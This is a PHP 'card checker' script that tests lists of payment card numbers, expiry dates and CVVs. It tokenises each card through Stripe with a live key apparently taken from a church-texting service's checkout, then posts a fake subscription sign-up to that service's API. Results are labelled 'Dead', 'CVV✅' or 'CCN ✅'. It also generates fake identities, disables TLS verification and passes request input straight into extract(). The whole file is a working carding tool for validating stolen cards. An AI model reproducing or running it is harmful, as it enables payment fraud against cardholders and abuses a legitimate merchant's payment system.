<?php

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function capture($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 


###CHECKER PART###  
$zip = rand(10001,90045);
$time = rand(30000,699999);
$rand = rand(0,99999);
$pass = rand(0000000000,9999999999);
$email = substr(md5(mt_rand()), 0, 7);
$name = substr(md5(mt_rand()), 0, 7);
$last = substr(md5(mt_rand()), 0, 7);

/////////////////////==========[Unavailable if empty]==========////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: m.stripe.com',
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.5',
            'Content-Type: text/plain;charset=UTF-8',
            'Origin: https://m.stripe.network',
            'Referer: https://m.stripe.network/inner.html'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "");
$res = curl_exec($ch);
$muid = trim(strip_tags(capture($res,'"muid":"','"')));
$sid = trim(strip_tags(capture($res,'"sid":"','"')));
$guid = trim(strip_tags(capture($res,'"guid":"','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: api.stripe.com',
  'Accept: application/json',
  'Accept-Language: en-US,en;q=0.9',
  'Content-Type: application/x-www-form-urlencoded',
  'Origin: https://js.stripe.com',
  'Referer: https://js.stripe.com/',
  'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&payment_user_agent=stripe.js%2F7e8ee2cfca%3B+stripe-js-v3%2F7e8ee2cfca%3B+card-element&referrer=https%3A%2F%2Fapp.textinchurch.com&time_on_page=272056&key=pk_live_1ejqRnB4uV3TIx2ckiJ0pwJP&pasted_fields=number");
$result1 = curl_exec($ch);
          
$id = capture($result1,'"id": "','"');
$msg1 = capture($result1,'"message": "','"');
echo"<br>$result1<br>";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.textinchurch.com/API/1_0/account.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Accept: application/json, text/plain, */*',
  'Content-Type: application/json;charset=UTF-8',
  'Host: api.vetchat.com.au',
  'Origin: https://app.textinchurch.com',
  'Referer: https://app.textinchurch.com/',
  'Sec-Fetch-Dest: empty',
  'Sec-Fetch-Mode: cors',
  'Sec-Fetch-Site: same-site',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
  'app_module: www.vetchat.com.au',
  'sec-ch-ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
  'sec-ch-ua-mobile: ?0',
  'sec-ch-ua-platform: "Windows"',
  ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"agreement":true,"account_name":"Melissa","account_first_name":"Melissa","account_last_name":"Melissa","account_email":"aqnhkl@diginey.com","account_email_confirm":"aqnhkl@diginey.com","account_mobile":"5874962256","account_phone":"","account_address1":"9601 Green Rd","account_city":"Berkeley","account_zip":"41647","account_state":"TX","account_country":"US","account_referer_id":null,"cart":"Imt8IsejM1SwZt3T","card_token":"tok_1O4AFEBoxEBjoujWdpdoZiS5","products":"basic_yearly","discount":"17OFF","trialDuration":14,"account_brand":"tic"}');
$result2 = curl_exec($ch);
echo"<br>$result2<br>";
$errormessage = trim(strip_tags(capture($result2,'"msg":"','"')));
           
          

###END OF CHECKER PART###

 if (strpos($result1,'card_error')) {
    $msg2 = "$msg1 ❌";
echo'
<b>Status -» Dead ❌
Response -» $msg1
Gateway - Stripe Auth
';
 }   
 elseif (strpos($result2, 'subscribe":true') || strpos($result2, 'Your card does not support this')|| strpos($result2, 'contact your bank'))
 {
echo'
<b>Status -» CVV✅
Response -» Approved
Gateway -» Stripe Auth
';}
           elseif (strpos($result2, 'security code')){
echo'
Status -» CCN ✅
Response -» Approved
Gateway -» Stripe Auth
';}
elseif($result2 == null) {
echo'
<b>Status -» API Down ❌
Response -» $result1
Gateway -» Stripe Auth
';}
else{
echo"
Status -» Declined ❌
Response -» $errormessage ❌
Gateway - Stripe Auth {site based}";}


#========================================================================
?>
